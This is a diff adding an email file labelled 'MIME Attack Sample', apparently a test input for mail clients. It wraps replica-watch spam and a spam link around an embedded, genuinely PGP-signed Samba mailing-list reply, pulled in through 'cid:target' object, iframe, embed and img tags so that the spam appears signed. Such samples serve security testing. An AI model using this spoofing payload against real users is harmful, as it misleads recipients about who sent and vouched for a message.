@@ -1,0 +1,87 @@
+From: 2.3895.10-b_wbsdigjar2.1@cda01.cdnow.com
+To: benjamin.rogers@enron.com, bill.rust@enron.com, chris.gaskill@enron.com, 
+Subject: MIME Attack Sample
+Content-Type: multipart/related; boundary="DELIMITER"
+--DELIMITER
+Content-Type: text/html
+Content-Type: text/plain;
+    charset="iso-8859-1"
+Content-Transfer-Encoding: 7bit
+
+ Exquisite Replica Watches!Unbelievable Quality At Unbeatable Prices!
+
+Buy Replica Watches with 25% Discount!
+
+  
+------=_NextPart_000_0000_6EFC59A5.AEECDA6A
+Content-Type: text/html;
+    charset="iso-8859-1"
+Content-Transfer-Encoding: quoted-printable
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<HTML><HEAD>
+<META http-equiv=3DContent-Type content=3D"text/html; =
+charset=3Diso-8859-1">
+<META content=3D"MSHTML 6.00.2900.2912" name=3D"GENERATOR">
+</HEAD>
+<BODY text=3D#000000 bgColor=3D#ffffff>
+
+<font size=3D"3" face=3D"Times New Roman"><p align=3D"center"><font =
+face=3D"Arial" color=3D"#ff00ff" size=3D"6"><strong>Exquisite Replica =
+Watches!<br /></strong></font><font face=3D"Arial" =
+size=3D"5"><strong>Unbelievable Quality At&nbsp;Unbeatable =
+Prices!</strong></font></p>
+<p align=3D"center"><strong><a href=3D"http://boktyzonggonee.com"><font =
+face=3D"Arial" color=3D"#ff0000" size=3D"5">Buy Replica Watches with 25%=
+ Discount!</font></a></strong></p></font>
+</BODY>
+</HTML>
+
+------=_NextPart_000_0000_6EFC59A5.AEECDA6A--
+
+
+<object width="100%" height="25" data="cid:target"></object>
+<iframe width="100%" height="25"  src="cid:target"></iframe>
+<embed  width="100%" height="25" src="cid:target"/></embed><img    width="100"  height="25"  src="cid:target">
+--DELIMITER
+Content-ID: <target>Content-Type: multipart/signed; boundary="BOUNDARY";  protocol="application/pgp-signature"
+--BOUNDARY
+Content-Type: text/plain
+Content-Transfer-Encoding: quoted-printable
+ SHA1
+
+James Peach wrote:
+
+> Jerry, can you give a quick summary of why you chose 
+> the particular branch structure in  this tree? For example,
+> why is "master" unpopulated?
+
+Strictly political.  Since we have two essentially
+different trees (v3-0 and v4-0) and no trunk, I choose
+to leave master empty (probably should delete it) so
+as to avoid giving the appearance of claiming one branch
+to have more importance over the other.
+
+
+
+
+
+cheers, jerry
+=====================================================================
+Samba                                    ------- http://www.samba.org
+Centeris                         -----------  http://www.centeris.com
+"What man is a man who does not make the world better?"      --Balian
+-BOUNDARY--
+Content-Type: application/pgp-signature; name="signature.asc"
+BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.6 (GNU/Linux)
+Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org
+
+iD8DBQFGgDwmIR7qMdg1EfYRAiYxAJ96JGO724boLlphd+BZhaOcsVMMGgCePG2w
+mDVwrYMtkeLNxRi/4AczGU0=
+=p8Ps
+-----END PGP SIGNATURE-----
+
+
+--BOUNDARY--
+--DELIMITER--
